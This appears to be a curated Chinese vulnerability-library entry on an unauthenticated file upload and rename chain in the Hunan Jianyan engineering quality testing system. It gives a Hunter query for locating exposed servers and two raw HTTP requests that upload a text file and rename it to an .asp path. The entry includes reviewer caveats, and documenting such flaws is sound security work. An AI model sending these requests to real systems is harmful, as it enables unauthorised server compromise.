---
source: "wy876 漏洞文库"
title: "湖南建研工程质量检测系统 Attachment upload加File.cshtml重命名写ASP"
product: "湖南建研工程质量检测系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；经典ASP运行环境"
prerequisites: "无Cookie请求，权限待核"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vbwrh9veoyfo2yhb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%BB%BA%E7%A0%94%E4%BF%A1%E6%81%AF/%E6%B9%96%E5%8D%97%E5%BB%BA%E7%A0%94%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9FAttachment%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"/Content/Theme/Standard/webSite/login.css\""
id: "vw-bdb9b032c6eed5e5f289fe07"
entity_id: "ve-bdb9b032c6eed5e5f289fe07"
schema_version: "1"
---

# 湖南建研工程质量检测系统 Attachment upload加File.cshtml重命名写ASP

## 条目说明

- 对象与具体问题：湖南建研工程质量检测系统；Attachment upload加File.cshtml重命名写ASP
- 版本、配置及部署条件：版本未知；经典ASP运行环境
- 认证与权限前提：无Cookie请求，权限待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两阶段上传txt再act=geturl重命名，不能只称上传口子，需核File.cshtml实际是复制/模板写还是重命名
- 正文12323344非ASP代码，落.asp仅证明后缀写入不证明执行
- _upload_guid123与落盘123.txt关系无响应解释，固定路径可能覆盖
- 与339单独FileUpload不同链保留；补修复版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
湖南建研质量监测系统由相关政府质量监督机构、参建单位等共同参与，根据各自的职责，上网操作相应的模块，实现工程质量监督业务的统一管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 湖南建研工程质量检测系统

## 三、资产测绘
+ hunter`web.body="/Content/Theme/Standard/webSite/login.css"`
+ 特征


## 四、漏洞复现
1. 上传txt文件

```http
POST /Applications/Attachment/upload.ashx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 204
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="123.txt"

12323344
--00content0boundary00
Content-Disposition: form-data; name="_upload_guid"

123
--00content0boundary00--

```

> 请求长度说明：原资料 Content-Length 为 204；保留原始标头；其数值未据实际请求体重新计算或验证。


2. 将文件改名

```http
POST /Standard/Editor/API/File.cshtml?act=geturl HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close

filename=/tempData/stc.asp&filetplpath=/tempData/123.txt
```

> 请求长度说明：原资料 Content-Length 为 59；保留原始标头；其数值未据实际请求体重新计算或验证。


3. 文件上传位置

```java
/tempData/stc.asp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vbwrh9veoyfo2yhb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
